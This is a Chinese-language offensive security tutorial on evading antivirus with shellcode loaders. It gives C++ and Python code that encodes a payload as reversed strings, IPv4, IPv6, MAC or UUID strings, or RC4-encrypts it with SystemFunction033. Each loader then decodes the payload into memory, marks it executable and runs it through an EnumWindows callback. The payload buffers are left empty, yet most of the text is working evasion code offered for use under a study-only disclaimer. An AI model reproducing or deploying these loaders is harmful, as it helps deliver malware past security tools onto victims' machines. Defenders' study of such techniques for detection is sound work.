由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。（本文仅用于交流学习）

反转字符串
-----

将字符串整个反转，然后再加载的时候从尾部进行加载，我们可以利用python来进行反转

```php
import sys

if(len(sys.argv) != 2):
    print("usage:\n python3 \"asdasd\"")
else:
    str = sys.argv[1]
    str = str[::-1]
    print(str)
```

![2.png](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-37594309bfc3cc1f0dd9b6b8085e92212daf472a.png)

先申请一个内存空间，然后利用下面的循环从尾部开始读取，然后赋值给temp

```php
char* temp = (char*)VirtualAllocEx(GetCurrentProcess(), NULL, memory_allocation, MEM_COMMIT, PAGE_READWRITE);

    for (int i = strlen(buf1) - 1; i >= 0; i--)
    {
        temp[p++] = buf1[i];
    }
```

```php
#include <windows.h>
#include <iostream>

using namespace std;

int main(int argc, char* argv[]) {

    char buf1[] = "";
    unsigned int char_in_hex;

    unsigned int iterations = strlen(buf1);
    unsigned int memory_allocation = strlen(buf1) / 2;
    int p = 0;
    char* temp = (char*)VirtualAllocEx(GetCurrentProcess(), NULL, memory_allocation, MEM_COMMIT, PAGE_READWRITE);

    for (int i = strlen(buf1) - 1; i >= 0; i--)
    {
        temp[p++] = buf1[i];
    }

    char* buf = (char*)temp;

    for (int i = 0; i < iterations - 1; i++) {
        sscanf_s(buf + 2 * i, "%2X", &char_in_hex);
        buf[i] = (char)char_in_hex;
    }

    LPVOID Address = VirtualAllocEx(GetCurrentProcess(), NULL, memory_allocation, MEM_COMMIT, PAGE_READWRITE);
    memcpy(Address, buf, memory_allocation);

    DWORD pflOldProtect = 0;
    VirtualProtectEx(GetCurrentProcess(), Address, memory_allocation, PAGE_EXECUTE, &pflOldProtect);

    EnumWindows((WNDENUMPROC)Address, NULL);

    return 0;
}
```

![1.png](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-2bcd8fb9db2f0cc7cd50cbd60553bf67f9dca4af.png)

IPV4内存加载
--------

IPv4是一种无连接的协议，操作在使用分组交换的链路层（如以太网）上。此协议会尽最大努力交付数据包，意即它不保证任何数据包均能送达目的地，也不保证所有数据包均按照正确的顺序无重复地到达。  
IPv4使用32位（4字节）地址，因此地址空间中只有4,294,967,296（232）个地址。  
我们可以利用RtlIpv4AddressToStringA函数将shellcode转换为ipv4的地址，然后利用RtlIpv4StringToAddressA函数将其转换回去，执行我们的代码

### RtlIpv4AddressToStringA

函数将 IPv4 地址转换为 Internet 标准点十进制格式的字符串。

```php
NTSYSAPI PSTR RtlIpv4AddressToStringA(
  [in]  const in_addr *Addr,
  [out] PSTR          S
);
```

第一个参数就是我们需要转换的数据，第二个参数就是用于存储转换后的数据，这里我用c++写的（网上用的是python写的）

```php
#include <windows.h>
#include <ip2string.h>
#include <iostream>

#pragma comment(lib, "ntdll.lib")
using namespace std;

int main(int argc, char* argv[]) {
    char buf[] = "";
    char* p = buf;
    char ip_str[sizeof(buf)];
    cout << "const char* buf[] = {";
    for (int i = 0; i <= (sizeof(buf) - 1) / 4; i++) {
        RtlIpv4AddressToStringA((const IN_ADDR*)&(*p), ip_str);
        p += 4;
        if (i == (sizeof(buf) - 1) / 4) {
            cout << "\"" << ip_str << "\"";
        }
        else {
            cout << "\"" << ip_str << "\",";
        }
    }
    cout << "};";

    return 0;
}
```

![3.png](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-03c3c436a875edd7c983abe23ca87a28aed19ddf.png)

### RtlIpv4StringToAddressA

将 IPv4 地址的字符串表示形式转换为二进制 IPv4 地址

```php
NTSYSAPI NTSTATUS RtlIpv4StringToAddressA(
  [in]  PCSTR   S,
  [in]  BOOLEAN Strict,
  [out] PCSTR   *Terminator,
  [out] in_addr *Addr
);
```

第一个参数就是接收需要转换的字符，二三个参数填默认即可，第四个参数是一个指针，其中存储 IPv4 地址的二进制表示形式。  
代码逻辑也很简单，首先申请一块内存地址，然后for循环RtlIpv4StringToAddressA函数对其进行转换，最后更改前面申请的内存区域的内存保护常量

```php
#include <windows.h>
#include <ip2string.h>
#include <iostream>

#pragma comment(lib, "ntdll.lib")
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
using namespace std;

int main() {
    const char* buf[] = { 0 };
    PCSTR lTerminator = NULL;
    DWORD pflOldProtect = 0;
    LPVOID alloc_mem = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT, PAGE_READWRITE);

    DWORD_PTR ptr = (DWORD_PTR)alloc_mem;
    int init = sizeof(buf) / sizeof(buf[0]);
    for (int i = 0; i < init; i++) {
        RPC_STATUS STATUS = RtlIpv4StringToAddressA((PCSTR)buf[i], FALSE, &lTerminator, (in_addr*)ptr);
        if (!NT_SUCCESS(STATUS)) {
            printf("[!] RtlIpv6StringToAddressA failed in %s result %x (%u)", buf[i], STATUS, GetLastError());
            return FALSE;
        }
        ptr += 4;
    }
    VirtualProtect(alloc_mem, sizeof(buf), PAGE_EXECUTE, &pflOldProtect);
    EnumWindows((WNDENUMPROC)alloc_mem, NULL);
    return 0;
}
```

![1.png](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-c1450b9ee859c2a5a262bd79c7e6f3790c346f8c.png)

IPV6内存加载
--------

IPv6是英文“Internet Protocol Version 6”（互联网协议第6版）的缩写，是互联网工程任务组（IETF）设计的用于替代IPv4的下一代IP协议，其地址数量号称可以为全世界的每一粒沙子编上一个地址 \[1\] 。 这里是用的冒分十六进制 格式为X:X:X:X:X:X:X:X，其中每个X表示地址中的16b，以十六进制表示，例如： ABCD:EF01:2345:6789:ABCD:EF01:2345:6789

和上面IPV4差不多只是函数变换了

```php
#include <windows.h>
#include <ip2string.h>
#include <iostream>

#pragma comment(lib, "ntdll.lib")
using namespace std;

int main(int argc, char* argv[]) {
    char buf[] = "";

    char* p = buf;
    char ip_str[sizeof(buf)];
    cout << "const char* buf[] = {";
    for (int i = 0; i <= (sizeof(buf) - 1) / 16; i++) {
        RtlIpv6AddressToStringA((const in6_addr*)&(*p), ip_str);
        p += 16;
        if (i == (sizeof(buf) - 1) / 16) {
            cout << "\"" << ip_str << "\"";
        }
        else {
            cout << "\"" << ip_str << "\",";
        }
    }
    cout << "};";

    return 0;
}
```

![4.png](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-3e467ba91fbe6ae1dd21013cd44f311ae853d16f.png)

我们可以使用如下进行加载执行

```php
#include <windows.h>
#include <ip2string.h>
#include <iostream>

#pragma comment(lib, "ntdll.lib")
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
using namespace std;

int main() {
    const char* buf[] = { 0 };
    PCSTR lTerminator = NULL;
    DWORD pflOldProtect = 0;
    LPVOID alloc_mem = VirtualAlloc(NULL, sizeof(buf)*16, MEM_COMMIT, PAGE_READWRITE);

    DWORD_PTR ptr = (DWORD_PTR)alloc_mem;
    int init = sizeof(buf) / sizeof(buf[0]);
    for (int i = 0; i < init; i++) {
        RPC_STATUS STATUS = RtlIpv6StringToAddressA((PCSTR)buf[i], &lTerminator, (in6_addr*)ptr);
        if (!NT_SUCCESS(STATUS)) {
            printf("[!] RtlIpv6StringToAddressA failed in %s result %x (%u)", buf[i], STATUS, GetLastError());
            return FALSE;
        }
        ptr += 16;
    }
    VirtualProtect(alloc_mem, sizeof(buf) * 16, PAGE_EXECUTE, &pflOldProtect);
    cout << sizeof(buf) * 16 << endl;
    EnumWindows((WNDENUMPROC)alloc_mem, NULL);
    return 0;
}
```

![1.png](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-22909b6f955797872c926d10dc7fbfc6777f5239.png)

MAC实现内存加载
---------

MAC地址也叫物理地址、硬件地址，由网络设备制造商生产时烧录在网卡的EPROM一种闪存芯片，通常可以通过程序擦写。IP地址与MAC地址在计算机里都是以二进制表示的，IP地址是32位的，而MAC地址则是48位（6个字节）。

### RtlEthernetAddressToStringA

```php
NTSYSAPI PSTR RtlEthernetAddressToStringA(
  [in]  const DL_EUI48 *Addr,
  [out] PSTR           S
);
```

第一个参数二进制格式的以太网地址，第二个参数用于存储以太网地址的NULL终止字符串表示形式，大小应足以容纳至少 18 个字符。  
和上面的差不多啊，因此加密代码也较为简单，但是需要注意  
6个字节转换一个mac值，\\x00是一个字节,当使用该函数后6个字节会变成18-1(`\x00`)个字节,即17个字节,当剩余字节数不满6个需要添加`\x00`补充字节数，必须将全部的shellcode全部转化为mac值

```php
#include <windows.h>
#include <ip2string.h>
#include <iostream>

#pragma comment(lib, "ntdll.lib")
using namespace std;

int main(int argc, char* argv[]) {
    char buf[] = "";
    char* p = buf;
    char ip_str[sizeof(buf)];
    cout << "const char* buf[] = {";
    for (int i = 0; i <= (sizeof(buf) - 1) / 6; i++) {
        RtlEthernetAddressToStringA((const DL_EUI48*)&(*p), ip_str);
        p += 6;
        if (i == (sizeof(buf) - 1) / 6) {
            cout << "\"" << ip_str << "\"";
        }
        else {
            cout << "\"" << ip_str << "\",";
        }
    }
    cout << "};";

    return 0;
}
```

![5.png](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-e259061bffca3bc952c35dd752240b9d1e42d314.png)

### RtlEthernetStringToAddressA

我们使用此函数将MAC值从字符串形式转为二进制格式

```php
NTSYSAPI NTSTATUS RtlEthernetStringToAddressA(
  [in]  PCSTR    S,
  [out] PCSTR    *Terminator,
  [out] DL_EUI48 *Addr
);
```

第一个参数接收需要转换的数据，第二个参数用于接收指向终止转换字符串的字符的指针，第三个参数用于存储以太网 MAC 地址的二进制表示形式。

代码加载的思路也很简单，先申请一块内存空间，然后循环RtlEthernetStringToAddressA函数对其进行转换，最后修改内存保护常量。

```php
#include <windows.h>
#include <ip2string.h>
#include <iostream>

#pragma comment(lib, "ntdll.lib")
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
using namespace std;

int main() {
    const char* buf[] = { 0 };
    PCSTR lTerminator = NULL;
    DWORD pflOldProtect = 0;
    LPVOID alloc_mem = VirtualAlloc(NULL, sizeof(buf)*6, MEM_COMMIT, PAGE_READWRITE);

    DWORD_PTR ptr = (DWORD_PTR)alloc_mem;
    int init = sizeof(buf) / sizeof(buf[0]);
    for (int i = 0; i < init; i++) {
        RPC_STATUS STATUS = RtlEthernetStringToAddressA((PCSTR)buf[i], &lTerminator, (DL_EUI48*)ptr);
        if (!NT_SUCCESS(STATUS)) {
            printf("[!] RtlEthernetStringToAddressA failed in %s result %x (%u)", buf[i], STATUS, GetLastError());
            return FALSE;
        }
        ptr += 6;
    }
    VirtualProtect(alloc_mem, sizeof(buf)*6, PAGE_EXECUTE, &pflOldProtect);
    EnumWindows((WNDENUMPROC)alloc_mem, NULL);
    return 0;
}
```

UUID实现内存加载
----------

通用唯一识别码(UUID),是用于计算机体系中以识别信息数目的一个128位标识符，根据标准方法生成，不依赖中央机构的注册和分配，UUID具有唯一性。

python中有UUID的模块

```php
import uuid

buf = b""
list = []

for i in range(len(buf)//16):
    b = uuid.UUID(bytes_le=buf[i*16:16+i*16])
    list.append(str(b))
print(str(list).replace("'", "\"").replace("[","{").replace("]","}") + ";")
```

![6.png](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-a9671312ebae8fe44bbe8f9089c048832fbd78de.png)

### UuidFromStringA

我们可以使用此函数将其写入执行

```php
RPC_STATUS UuidFromStringA(
  RPC_CSTR StringUuid,
  UUID     *Uuid
);
```

第一个参数指向UUID的字符串表示形式的指针，第二个参数以二进制形式返回指向UUID的指针。

逻辑也是很简单

```php
#include <windows.h>
#include <iostream>

#pragma comment(lib, "Rpcrt4.lib")
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
using namespace std;

int main() {
    const char* buf[] = { 0 };
    PCSTR lTerminator = NULL;
    DWORD pflOldProtect = 0;
    LPVOID alloc_mem = VirtualAlloc(NULL, sizeof(buf) * 16, MEM_COMMIT, PAGE_READWRITE);

    DWORD_PTR ptr = (DWORD_PTR)alloc_mem;
    int init = sizeof(buf) / sizeof(buf[0]);
    for (int i = 0; i < init; i++) {
        RPC_STATUS STATUS = UuidFromStringA((RPC_CSTR)buf[i], (UUID*)ptr);
        if (!NT_SUCCESS(STATUS)) {
            printf("[!] RtlEthernetStringToAddressA failed in %s result %x (%u)", buf[i], STATUS, GetLastError());
            return FALSE;
        }
        ptr += 16;
    }
    VirtualProtect(alloc_mem, sizeof(buf)*16, PAGE_EXECUTE, &pflOldProtect);
    EnumWindows((WNDENUMPROC)alloc_mem, NULL);
    return 0;
}
```

![1.png](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-cb0d6698125da560c7378b8e9a776c7ab79f29e7.png)

SystemFunction033
-----------------

这个函数能够通过RC4加密方式对内存区域进行加密/解密

函数原型

```php
struct ustring {
    DWORD Length;
    DWORD MaximumLength;
    PUCHAR Buffer;
} _data, key;

typedef NTSTATUS(WINAPI* _SystemFunction033)(
    struct ustring* memoryRegion,
    struct ustring* keyPointer
);
```

加密实现

```php
#include "function.h"

int main() {
    char _key[] = "asadsasdasasd";

    unsigned char buf[] = { 0 };
    key.Buffer = (PUCHAR)(&_key);
    key.Length = sizeof(key);

    _data.Buffer = (PUCHAR)buf;
    _data.Length = sizeof(buf);

    SystemFunction033(&_data, &key);
    printf("unsigned char buf[] = {");
    for (int i = 0; i < _data.Length; i++) {
        if (i == _data.Length - 1) {
            printf("0x%02x", _data.Buffer[i]);
        }
        else
        {
            printf("0x%02x, ", _data.Buffer[i]);
        }
    }
    printf("};");
}
```

![7.png](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-e48ce0894440d7defae09fdc01b261279a6de5f2.png)

后面可以SystemFunction033进行解密然后执行（具体分析可以看参考链接）

```php
#include "function.h"

int main() {
    DWORD pflOldProtect = 0;
    char _key[] = "alphaBetagamma";

    unsigned char buf[] = { 0 };
    key.Buffer = (PUCHAR)(&_key);
    key.Length = sizeof(key);

    _data.Buffer = (PUCHAR)buf;
    _data.Length = sizeof(buf);

    SystemFunction033(&_data, &key);
    LPVOID alloc_mem = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT, PAGE_READWRITE);
    memcpy(alloc_mem, buf, sizeof(buf));
    VirtualProtect(alloc_mem, sizeof(buf), PAGE_EXECUTE_READWRITE, &pflOldProtect);
    EnumWindows((WNDENUMPROC)alloc_mem, NULL);
}
```

![1.png](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-c2f00bcb8fba6b973e50055b99ea03c6f86c7108.png)

参考：  
<https://learn.microsoft.com/zh-cn/windows/win32/api/ip2string/nf-ip2string-rtlipv6addresstostringa>  
<https://learn.microsoft.com/zh-cn/windows/win32/api/rpcdce/nf-rpcdce-uuidfromstringa>  
<https://osandamalith.com/2022/11/10/encrypting-shellcode-using-systemfunction032-033/>